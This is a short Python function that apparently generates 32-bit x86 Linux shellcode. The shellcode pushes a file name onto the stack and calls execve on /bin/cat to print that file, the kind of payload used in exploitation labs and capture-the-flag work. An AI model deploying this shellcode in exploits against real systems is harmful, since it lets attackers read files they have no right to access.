def cat(filename = 'file'):
    """Args: Name of file to cat
    Cat a file."""
    pushstr = ''
    length = len(filename)
    off = length % 4
    filename += ' ' * (4 - off) if off else ''
    if off:
        pushnull = ''
        movnull = 'mov [ecx + %d], al\n' % length
    else:
        pushnull = 'push eax\n'
        movnull = ''
    for i in range(0, len(filename), 4):
        pushstr = 'push `%s`\n' % filename[i : i + 4] + pushstr
    return """
        xor eax, eax
        cdq
    
        push eax
        push `/cat`
        push `/bin`
        mov ebx, esp
        %s%s
        mov ecx, esp
        %s
        push eax
        push ecx 
        push ebx 
        mov ecx, esp
        
        mov al, 0xb
        int 0x80
""" % (pushnull, pushstr, movnull)

